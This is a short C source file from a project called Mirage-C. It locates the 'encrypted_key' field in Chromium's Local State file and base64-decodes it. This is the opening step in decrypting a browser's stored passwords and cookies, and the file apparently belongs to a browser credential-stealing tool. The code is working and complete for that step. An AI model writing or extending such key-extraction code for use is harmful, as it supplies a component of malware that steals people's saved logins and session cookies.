/*
 * chrome_key.c — Chrome encryption key extraction for Mirage-C
 *
 * Direct translation of Zig src/crypto/chrome_key.zig.
 * Provides base64 decoding and encrypted_key extraction from
 * Chromium's Local State JSON file.
 */

#include "chrome_key.h"
#include "utils/base64.h"
#include <string.h>

/* ── mirage_extract_encrypted_key ─────────────────────────── */

uint8_t* mirage_extract_encrypted_key(const uint8_t* json, size_t json_len,
                                       uint8_t* output, size_t output_size) {
    const char marker[] = "\"encrypted_key\":\"";
    size_t marker_len = sizeof(marker) - 1;

    /* Find marker in JSON */
    const uint8_t* start = NULL;
    for (size_t i = 0; i + marker_len <= json_len; i++) {
        if (memcmp(json + i, marker, marker_len) == 0) {
            start = json + i + marker_len;
            break;
        }
    }
    if (!start) return NULL;

    /* Find closing quote */
    const uint8_t* end = NULL;
    for (const uint8_t* p = start; p < json + json_len; p++) {
        if (*p == '"') {
            end = p;
            break;
        }
    }
    if (!end || end == start) return NULL;

    size_t b64_len = (size_t)(end - start);
    size_t decoded_size = output_size;
    int decoded = base64_decode((const char*)start, b64_len, output, decoded_size);
    if (decoded < 0) return NULL;
    return output;
}
